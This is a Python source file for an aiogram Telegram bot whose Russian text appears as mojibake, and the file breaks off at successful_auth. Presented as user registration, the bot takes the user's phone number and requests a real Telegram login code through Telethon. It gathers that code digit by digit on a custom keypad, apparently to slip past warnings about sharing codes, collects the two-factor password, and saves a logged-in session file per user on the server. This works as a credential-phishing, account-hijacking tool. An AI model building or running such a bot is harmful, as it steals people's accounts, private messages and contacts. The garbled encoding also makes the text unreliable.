import os
import asyncio
import logging
from datetime import datetime
from aiogram import Router, Bot, F, types
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.utils.keyboard import ReplyKeyboardBuilder, InlineKeyboardBuilder
from aiogram.exceptions import TelegramBadRequest

from telethon.sync import TelegramClient
from telethon.errors import SessionPasswordNeededError, PhoneCodeInvalidError, FloodWaitError

from handlers.states import AuthStates
from handlers.utils import (
    auth_start_times, user_auth_data, admin_ids, 
    check_auth_timeout, admin_notifications
)

# –ù–∞—Å—Ç—Ä–æ–π–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è
logger = logging.getLogger(__name__)

# –°–æ–∑–¥–∞–µ–º —Ä–æ—É—Ç–µ—Ä
router = Router()

@router.callback_query(F.data == "register")
async def process_register(callback: types.CallbackQuery, state: FSMContext, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –Ω–∞–∂–∞—Ç–∏—è –Ω–∞ –∫–Ω–æ–ø–∫—É —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏"""
    user_id = callback.from_user.id
    
    # –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –≤—Ä–µ–º—è –Ω–∞—á–∞–ª–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    auth_start_times[user_id] = datetime.now()
    
    # –ó–∞–ø—É—Å–∫–∞–µ–º —Ç–∞–π–º–µ—Ä –ø—Ä–æ–≤–µ—Ä–∫–∏ —Ç–∞–π–º–∞—É—Ç–∞
    asyncio.create_task(check_auth_timeout(user_id, bot))
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –∑–∞–ø—Ä–æ—Å–∞ –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞
    keyboard = ReplyKeyboardBuilder()
    keyboard.button(text="üì± –ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞", request_contact=True)
    keyboard.adjust(1)
    
    await state.set_state(AuthStates.waiting_for_phone)
    await callback.message.answer(
        "*üì≤ –î–ª—è —Ä–µ–≥–∏—Å—Ç—Ä–∞—Ü–∏–∏ –Ω–µ–æ–±—Ö–æ–¥–∏–º–æ –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞*\n\n"
        "*–ù–∞–∂–º–∏—Ç–µ –Ω–∞ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ:*",
        reply_markup=keyboard.as_markup(resize_keyboard=True),
        parse_mode="Markdown"
    )
    await callback.answer()

@router.message(AuthStates.waiting_for_phone, F.contact)
async def process_phone_number(message: types.Message, state: FSMContext, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –ø–æ–ª—É—á–µ–Ω–∏—è –Ω–æ–º–µ—Ä–∞ —Ç–µ–ª–µ—Ñ–æ–Ω–∞"""
    user_id = message.from_user.id
    phone = message.contact.phone_number
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, –Ω–∞—á–∏–Ω–∞–µ—Ç—Å—è –ª–∏ –Ω–æ–º–µ—Ä —Å +
    if not phone.startswith('+'):
        phone = '+' + phone
    
    # –°–æ—Ö—Ä–∞–Ω—è–µ–º –Ω–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞ –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏
    await state.update_data(phone=phone)
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    api_id = os.getenv('API_ID')
    api_hash = os.getenv('API_HASH')
    
    # –ü—Ä–æ–≤–µ—Ä–∫–∞ —á—Ç–æ API_ID –∏ API_HASH –∑–∞–¥–∞–Ω—ã
    if not api_id or not api_hash:
        logger.error("API_ID –∏–ª–∏ API_HASH –Ω–µ –Ω–∞—Å—Ç—Ä–æ–µ–Ω—ã –≤ .env —Ñ–∞–π–ª–µ")
        await message.answer(
            "*‚ö†Ô∏è –û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞*\n\n"
            "*–°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.*",
            parse_mode="Markdown"
        )
        return
    
    # –û–ß–ï–ù–¨ –í–ê–ñ–ù–û: API_ID –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å —Ü–µ–ª—ã–º —á–∏—Å–ª–æ–º (int)
    try:
        api_id = int(api_id)
    except ValueError:
        logger.error(f"API_ID –Ω–µ —è–≤–ª—è–µ—Ç—Å—è —á–∏—Å–ª–æ–º: {api_id}")
        await message.answer(
            "*‚ö†Ô∏è –û—à–∏–±–∫–∞ –Ω–∞—Å—Ç—Ä–æ–π–∫–∏ –±–æ—Ç–∞*\n\n"
            "*–°–≤—è–∂–∏—Ç–µ—Å—å —Å –∞–¥–º–∏–Ω–∏—Å—Ç—Ä–∞—Ç–æ—Ä–æ–º.*",
            parse_mode="Markdown"
        )
        return
    
    # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    await message.answer(
        "*üì≤ –ù–∞—á–∏–Ω–∞–µ–º –ø—Ä–æ—Ü–µ—Å—Å –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏...*\n\n"
        f"*–ù–æ–º–µ—Ä —Ç–µ–ª–µ—Ñ–æ–Ω–∞:* `{phone}`",
        parse_mode="Markdown"
    )
    
    # –°–æ–∑–¥–∞–µ–º —Å–µ—Å—Å–∏—é Telethon
    session_file = f'sessions/{user_id}'
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∫–æ–¥ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º phone_code_hash
        logger.info(f"–û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∑–∞–ø—Ä–æ—Å –∫–æ–¥–∞ –Ω–∞ –Ω–æ–º–µ—Ä: {phone}")
        result = await client.send_code_request(phone)
        phone_code_hash = result.phone_code_hash
        logger.info(f"–ö–æ–¥ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω, phone_code_hash: {phone_code_hash}")
        
        await state.update_data(phone_code_hash=phone_code_hash)
        
        # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞
        keyboard = ReplyKeyboardBuilder()
        for i in range(1, 10):
            keyboard.button(text=str(i))
        keyboard.button(text="0")
        keyboard.button(text="‚å´")  # –ö–Ω–æ–ø–∫–∞ —É–¥–∞–ª–µ–Ω–∏—è
        keyboard.adjust(3, 3, 3, 2)  # –†–∞—Å–ø–æ–ª–∞–≥–∞–µ–º –ø–æ 3 –∫–Ω–æ–ø–∫–∏ –≤ —Ä—è–¥
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –ø—É—Å—Ç—É—é —Å—Ç—Ä–æ–∫—É –¥–ª—è –∫–æ–¥–∞
        user_auth_data[user_id] = ""
        
        # –°–Ω–∞—á–∞–ª–∞ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π
        await message.answer(
            "*üì≤ –ö–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω!*\n\n"
            "*–í–≤–µ–¥–∏—Ç–µ –ø–æ–ª—É—á–µ–Ω–Ω—ã–π –∫–æ–¥, –∏—Å–ø–æ–ª—å–∑—É—è –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –Ω–∏–∂–µ.*\n"
            "*–ù–∞–∂–º–∏—Ç–µ –Ω–∞ ‚å´ –¥–ª—è —É–¥–∞–ª–µ–Ω–∏—è –ø–æ—Å–ª–µ–¥–Ω–µ–π —Ü–∏—Ñ—Ä—ã.*",
            reply_markup=keyboard.as_markup(resize_keyboard=True),
            parse_mode="Markdown"
        )
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—Ç–¥–µ–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ —Å —Ç–µ–∫—É—â–∏–º –∫–æ–¥–æ–º, –∫–æ—Ç–æ—Ä–æ–µ –±—É–¥–µ–º —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞—Ç—å
        code_msg = await message.answer(
            "*–¢–µ–∫—É—â–∏–π –∫–æ–¥:* _(–ø—É—Å—Ç–æ)_",
            parse_mode="Markdown"
        )
        
        # –°–æ—Ö—Ä–∞–Ω—è–µ–º –∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–æ–¥–æ–º –¥–ª—è –¥–∞–ª—å–Ω–µ–π—à–µ–≥–æ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏—è
        await state.update_data(code_message_id=code_msg.message_id)
        await state.set_state(AuthStates.waiting_for_code)
        
    except FloodWaitError as e:
        # –ï—Å–ª–∏ —Å—Ä–∞–±–æ—Ç–∞–ª–∞ –∑–∞—â–∏—Ç–∞ –æ—Ç —Ñ–ª—É–¥–∞, —Å–æ–æ–±—â–∞–µ–º –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—é
        error_message = f"FloodWaitError: –Ω—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {e.seconds} —Å–µ–∫—É–Ω–¥"
        logger.error(error_message)
        
        await message.answer(
            f"*‚ö†Ô∏è –°—Ä–∞–±–æ—Ç–∞–ª–∞ –∑–∞—â–∏—Ç–∞ –æ—Ç —Ñ–ª—É–¥–∞*\n\n"
            f"*–ù—É–∂–Ω–æ –ø–æ–¥–æ–∂–¥–∞—Ç—å {e.seconds} —Å–µ–∫—É–Ω–¥ –ø—Ä–µ–∂–¥–µ —á–µ–º –ø—Ä–æ–±–æ–≤–∞—Ç—å —Å–Ω–æ–≤–∞.*",
            parse_mode="Markdown"
        )
        await state.clear()
        
        # –£–¥–∞–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        if user_id in auth_start_times:
            del auth_start_times[user_id]
        if user_id in user_auth_data:
            del user_auth_data[user_id]
        
    except Exception as e:
        # –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
        error_message = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {str(e)}"
        logger.error(error_message)
        
        await message.answer(
            f"*‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞*\n\n"
            f"*–û—à–∏–±–∫–∞:* `{str(e)}`\n\n"
            "*–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É /start*",
            parse_mode="Markdown"
        )
        await state.clear()
        
        # –£–¥–∞–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        if user_id in auth_start_times:
            del auth_start_times[user_id]
        if user_id in user_auth_data:
            del user_auth_data[user_id]
            
        # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª —Å–µ—Å—Å–∏–∏, –µ—Å–ª–∏ –æ–Ω –±—ã–ª —Å–æ–∑–¥–∞–Ω
        if os.path.exists(f"{session_file}.session"):
            try:
                os.remove(f"{session_file}.session")
            except PermissionError:
                pass
    finally:
        if client and client.is_connected():
            await client.disconnect()

@router.message(AuthStates.waiting_for_code, F.text)
async def process_code(message: types.Message, state: FSMContext, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ –∫–æ–¥–∞ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è"""
    user_id = message.from_user.id
    text = message.text
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è
    data = await state.get_data()
    code_message_id = data.get("code_message_id")
    
    # –ü—Ä–æ–≤–µ—Ä—è–µ–º –Ω–∞–ª–∏—á–∏–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –≤ —Å–ª–æ–≤–∞—Ä–µ –¥–∞–Ω–Ω—ã—Ö –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    if user_id not in user_auth_data:
        await message.answer(
            "*‚ö†Ô∏è –í—Ä–µ–º—è –æ–∂–∏–¥–∞–Ω–∏—è –∏—Å—Ç–µ–∫–ª–æ*\n\n"
            "*–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–∞—á–Ω–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å –∑–∞–Ω–æ–≤–æ —Å –∫–æ–º–∞–Ω–¥—ã /start*",
            parse_mode="Markdown"
        )
        await state.clear()
        return
    
    # –û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ–º –≤–≤–æ–¥ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è
    if text == "‚å´":
        # –£–¥–∞–ª—è–µ–º –ø–æ—Å–ª–µ–¥–Ω—é—é —Ü–∏—Ñ—Ä—É
        if user_auth_data[user_id]:
            user_auth_data[user_id] = user_auth_data[user_id][:-1]
    elif text.isdigit() and len(text) == 1:
        # –î–æ–±–∞–≤–ª—è–µ–º —Ü–∏—Ñ—Ä—É –∫ –∫–æ–¥—É
        user_auth_data[user_id] += text
    else:
        # –ù–µ–≤–µ—Ä–Ω—ã–π –≤–≤–æ–¥ - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –∏ –Ω–µ –æ–±–Ω–æ–≤–ª—è–µ–º –∫–æ–¥
        await message.answer(
            "*‚ö†Ô∏è –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ —Ç–æ–ª—å–∫–æ —Ü–∏—Ñ—Ä—ã –Ω–∞ –∫–ª–∞–≤–∏–∞—Ç—É—Ä–µ –∏–ª–∏ –∫–Ω–æ–ø–∫—É —É–¥–∞–ª–µ–Ω–∏—è*",
            parse_mode="Markdown"
        )
        return
    
    # –û—Ç–æ–±—Ä–∞–∂–∞–µ–º —Ç–µ–∫—É—â–∏–π –∫–æ–¥, –æ–±–Ω–æ–≤–ª—è—è —Å—É—â–µ—Å—Ç–≤—É—é—â–µ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
    current_code = user_auth_data[user_id] or "_(–ø—É—Å—Ç–æ)_"
    
    try:
        # –†–µ–¥–∞–∫—Ç–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–¥–æ–º
        if code_message_id:
            try:
                await bot.edit_message_text(
                    f"*–¢–µ–∫—É—â–∏–π –∫–æ–¥:* {current_code}",
                    chat_id=user_id,
                    message_id=code_message_id,
                    parse_mode="Markdown"
                )
            except TelegramBadRequest as e:
                # –ï—Å–ª–∏ —Å–æ–æ–±—â–µ–Ω–∏–µ –Ω–µ –∏–∑–º–µ–Ω–∏–ª–æ—Å—å, Telegram –≤—ã–¥–∞—Å—Ç –æ—à–∏–±–∫—É, –Ω–æ –º—ã –µ—ë –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º
                if "message is not modified" not in str(e).lower():
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Ä–µ–¥–∞–∫—Ç–∏—Ä–æ–≤–∞–Ω–∏–∏ —Å–æ–æ–±—â–µ–Ω–∏—è: {e}")
        else:
            # –ï—Å–ª–∏ –Ω–µ—Ç ID —Å–æ–æ–±—â–µ–Ω–∏—è —Å –∫–æ–¥–æ–º, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ –∏ —Å–æ—Ö—Ä–∞–Ω—è–µ–º –µ–≥–æ ID
            new_code_msg = await message.answer(
                f"*–¢–µ–∫—É—â–∏–π –∫–æ–¥:* {current_code}",
                parse_mode="Markdown"
            )
            await state.update_data(code_message_id=new_code_msg.message_id)
    except Exception as e:
        logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –∫–æ–¥–∞: {e}")
        # –í —Å–ª—É—á–∞–µ –ø—Ä–æ–±–ª–µ–º –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
        await message.answer(
            f"*–¢–µ–∫—É—â–∏–π –∫–æ–¥:* {current_code}",
            parse_mode="Markdown"
        )
    
    # –ï—Å–ª–∏ –Ω–∞–±—Ä–∞–ª–∏ 5 —Ü–∏—Ñ—Ä, –ø—ã—Ç–∞–µ–º—Å—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è
    if len(user_auth_data[user_id]) == 5:
        await try_login_with_code(message, state, bot)

@router.message(AuthStates.waiting_for_2fa, F.text)
async def process_2fa(message: types.Message, state: FSMContext, bot: Bot):
    """–û–±—Ä–∞–±–æ—Ç—á–∏–∫ –≤–≤–æ–¥–∞ –ø–∞—Ä–æ–ª—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏"""
    user_id = message.from_user.id
    password = message.text
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    code = user_auth_data.get(user_id, "")
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    api_id = int(os.getenv('API_ID'))
    api_hash = os.getenv('API_HASH')
    
    # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å–µ—Å—Å–∏–∏
    session_file = f'sessions/{user_id}'
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç –∏ –ø—ã—Ç–∞–µ–º—Å—è –≤–æ–π—Ç–∏ —Å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–µ–π
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º —Ç–µ–∫—É—â–∏–π —Å—Ç–∞—Ç—É—Å
        if not await client.is_user_authorized():
            # –°–Ω–∞—á–∞–ª–∞ –ø—Ä–æ–±—É–µ–º –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –∫–æ–¥ –µ—â–µ —Ä–∞–∑, —á—Ç–æ–±—ã –∫–ª–∏–µ–Ω—Ç –∑–Ω–∞–ª, —á—Ç–æ –º—ã –≤ –ø—Ä–æ—Ü–µ—Å—Å–µ 2FA
            try:
                await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
            except SessionPasswordNeededError:
                # –≠—Ç–æ –æ–∂–∏–¥–∞–µ–º–∞—è –æ—à–∏–±–∫–∞, –∫–æ—Ç–æ—Ä–∞—è –æ–∑–Ω–∞—á–∞–µ—Ç, —á—Ç–æ –∫–ª–∏–µ–Ω—Ç –≥–æ—Ç–æ–≤ –∫ –≤–≤–æ–¥—É 2FA
                pass
            except Exception as e:
                logger.warning(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –ø–æ–≤—Ç–æ—Ä–Ω–æ–π –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞ –¥–ª—è 2FA: {e}")
        
        # –ü—Ä–æ–±—É–µ–º –≤–≤–µ—Å—Ç–∏ –ø–∞—Ä–æ–ª—å 2FA
        await client.sign_in(password=password)
        
        # –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
        await successful_auth(message, user_id, session_file, bot)
        
    except Exception as e:
        # –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        error_message = f"–û—à–∏–±–∫–∞ –ø—Ä–∏ 2FA –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {str(e)}"
        logger.error(error_message)
        
        await message.answer(
            "*‚ö†Ô∏è –û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏*\n\n"
            f"*–û—à–∏–±–∫–∞:* `{str(e)}`\n\n"
            "*–ù–µ–≤–µ—Ä–Ω—ã–π –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞.*",
            parse_mode="Markdown"
        )
    finally:
        if client and client.is_connected():
            await client.disconnect()
        
        # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –ø–æ—Å–ª–µ —É—Å–ø–µ—à–Ω–æ–π –∏–ª–∏ –Ω–µ—É–¥–∞—á–Ω–æ–π –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
        if user_id in user_auth_data:
            del user_auth_data[user_id]

async def try_login_with_code(message: types.Message, state: FSMContext, bot: Bot):
    """–ü—ã—Ç–∞–µ—Ç—Å—è –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞—Ç—å—Å—è —Å –≤–≤–µ–¥–µ–Ω–Ω—ã–º –∫–æ–¥–æ–º"""
    user_id = message.from_user.id
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –∏–∑ —Å–æ—Å—Ç–æ—è–Ω–∏—è
    data = await state.get_data()
    phone = data.get("phone")
    phone_code_hash = data.get("phone_code_hash")
    code = user_auth_data[user_id]
    
    # –ü–æ–ª—É—á–∞–µ–º –¥–∞–Ω–Ω—ã–µ –¥–ª—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
    api_id = int(os.getenv('API_ID'))
    api_hash = os.getenv('API_HASH')
    
    # –ü—É—Ç—å –∫ —Ñ–∞–π–ª—É —Å–µ—Å—Å–∏–∏
    session_file = f'sessions/{user_id}'
    
    # –°–æ–æ–±—â–∞–µ–º –æ –ø–æ–ø—ã—Ç–∫–µ –≤—Ö–æ–¥–∞
    await message.answer(
        "*üîÑ –í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –≤—Ö–æ–¥ –≤ –∞–∫–∫–∞—É–Ω—Ç...*",
        parse_mode="Markdown"
    )
    
    # –°–æ–∑–¥–∞–µ–º –∫–ª–∏–µ–Ω—Ç –∏ –ø—ã—Ç–∞–µ–º—Å—è –≤–æ–π—Ç–∏
    client = TelegramClient(session_file, api_id, api_hash)
    
    try:
        await client.connect()
        
        try:
            logger.info(f"–ü—ã—Ç–∞–µ–º—Å—è –≤–æ–π—Ç–∏ —Å –∫–æ–¥–æ–º {code}, phone_code_hash: {phone_code_hash}")
            # –ü—ã—Ç–∞–µ–º—Å—è –≤–æ–π—Ç–∏ —Å –∫–æ–¥–æ–º –∏ phone_code_hash
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
            
            # –£—Å–ø–µ—à–Ω–∞—è –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—è
            await successful_auth(message, user_id, session_file, bot)
            
        except SessionPasswordNeededError:
            # –ï—Å–ª–∏ —Ç—Ä–µ–±—É–µ—Ç—Å—è –ø–∞—Ä–æ–ª—å –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–æ–π –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏–∏
            await state.set_state(AuthStates.waiting_for_2fa)
            
            # –°–æ–∑–¥–∞–µ–º –æ–±—ã—á–Ω—É—é –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É
            keyboard = types.ReplyKeyboardRemove()
            
            await message.answer(
                "*üîê –¢—Ä–µ–±—É–µ—Ç—Å—è –¥–≤—É—Ö—Ñ–∞–∫—Ç–æ—Ä–Ω–∞—è –∞—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è*\n\n"
                "*–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –≤–≤–µ–¥–∏—Ç–µ –ø–∞—Ä–æ–ª—å –æ—Ç –≤–∞—à–µ–≥–æ –∞–∫–∫–∞—É–Ω—Ç–∞:*",
                reply_markup=keyboard,
                parse_mode="Markdown"
            )
            
        except PhoneCodeInvalidError:
            # –ï—Å–ª–∏ –∫–æ–¥ –Ω–µ–≤–µ—Ä–Ω—ã–π
            logger.info(f"–ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è: {code}")
            await message.answer(
                "*‚ö†Ô∏è –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è*\n\n"
                "*–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ –≤–≤–µ—Å—Ç–∏ –∫–æ–¥ –∑–∞–Ω–æ–≤–æ.*",
                parse_mode="Markdown"
            )
            
            # –û—á–∏—â–∞–µ–º –∫–æ–¥ –∏ –ø–æ–∑–≤–æ–ª—è–µ–º –≤–≤–µ—Å—Ç–∏ –∑–∞–Ω–æ–≤–æ
            user_auth_data[user_id] = ""
            
            # –û–±–Ω–æ–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–¥–æ–º
            if data.get("code_message_id"):
                try:
                    await bot.edit_message_text(
                        "*–¢–µ–∫—É—â–∏–π –∫–æ–¥:* _(–ø—É—Å—Ç–æ)_",
                        chat_id=user_id,
                        message_id=data["code_message_id"],
                        parse_mode="Markdown"
                    )
                except Exception as e:
                    logger.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–±—Ä–æ—Å–µ –∫–æ–¥–∞: {e}")
            
        except Exception as e:
            # –í —Å–ª—É—á–∞–µ –æ—à–∏–±–∫–∏
            error_message = f"–û—à–∏–±–∫–∞ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏: {str(e)}"
            logger.error(error_message)
            
            await message.answer(
                "*‚ö†Ô∏è –ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞ –ø—Ä–∏ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏*\n\n"
                f"*–û—à–∏–±–∫–∞:* `{str(e)}`\n\n"
                "*–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —á–µ—Ä–µ–∑ –∫–æ–º–∞–Ω–¥—É /start*",
                parse_mode="Markdown"
            )
            
            # –û—á–∏—â–∞–µ–º —Å–æ—Å—Ç–æ—è–Ω–∏–µ –∏ –¥–∞–Ω–Ω—ã–µ –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏
            await state.clear()
            if user_id in auth_start_times:
                del auth_start_times[user_id]
            if user_id in user_auth_data:
                del user_auth_data[user_id]
            
            # –£–¥–∞–ª—è–µ–º —Ñ–∞–π–ª —Å–µ—Å—Å–∏–∏, –µ—Å–ª–∏ –æ–Ω –±—ã–ª —Å–æ–∑–¥–∞–Ω
            try:
                if os.path.exists(f"{session_file}.session"):
                    os.remove(f"{session_file}.session")
            except PermissionError:
                # –ï—Å–ª–∏ —Ñ–∞–π–ª –∑–∞–Ω—è—Ç –¥—Ä—É–≥–∏–º –ø—Ä–æ—Ü–µ—Å—Å–æ–º, –ø–æ–ø—Ä–æ–±—É–µ–º –ø–æ–∑–∂–µ
                pass
    finally:
        if client and client.is_connected():
            await client.disconnect()

async def successful_auth(message: types.Message, user_id, session_file, bot: Bot):
    """–û–±—Ä–∞–±–∞—Ç—ã–≤–∞–µ—Ç —É—Å–ø–µ—à–Ω—É—é –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏—é"""
